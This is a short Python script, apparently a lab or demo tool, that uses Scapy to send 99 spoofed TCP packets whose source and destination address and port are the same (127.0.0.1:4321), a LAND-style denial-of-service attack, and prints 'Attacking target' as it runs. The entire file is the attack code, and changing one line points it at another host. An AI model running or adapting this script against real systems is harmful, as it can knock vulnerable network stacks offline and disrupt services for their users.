#!/usr/bin/env python3

import sys
from scapy.all import *

target = str("127.0.0.1")
port = int(4321)

print("Attacking target " + target + " on port " + str(port))

i = IP()
i.dst = target
i.src = target

t = TCP()
t.dport = port
t.sport = port

for x in range(1, 100):
    send(i/t)
    print("IP/TCP " + target + ":" + str(port) + " > " + target + ":" + str(port) + " S")

print("Done!")
